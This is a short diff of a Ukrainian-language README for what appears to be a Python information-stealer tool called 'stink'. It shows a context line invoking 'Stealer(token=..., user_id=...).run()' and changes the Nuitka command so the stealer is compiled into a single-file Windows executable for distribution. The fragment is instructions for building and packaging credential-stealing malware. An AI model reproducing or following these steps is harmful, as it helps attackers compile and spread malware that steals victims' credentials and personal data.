@@ -134,6 +134,6 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 Відкриваємо термінал Python. Перейшовши в директорію з проектом прописуємо наступну команду (або просто відкривши термінал, якщо ви використовуєте PyCharm):
 ```python
-nuitka --exe test.py
+nuitka --onefile --include-package=stink stink_test.py
 ```
 Після виконання команди отримуємо test.exe файл вагою в 234 КБ.
